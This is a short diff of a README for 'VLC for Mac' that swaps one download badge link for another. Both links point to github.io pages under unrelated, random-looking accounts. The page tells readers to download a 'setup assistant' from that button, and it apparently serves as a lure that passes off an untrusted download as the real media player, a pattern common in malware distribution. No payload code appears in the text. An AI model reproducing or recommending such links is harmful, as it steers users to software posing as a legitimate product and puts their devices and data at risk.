@@ -1,6 +1,6 @@
 # VLC for Mac
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://shuziktobehuman.github.io/huja/VLC)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://mitrobandus.github.io/.github/VLC)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
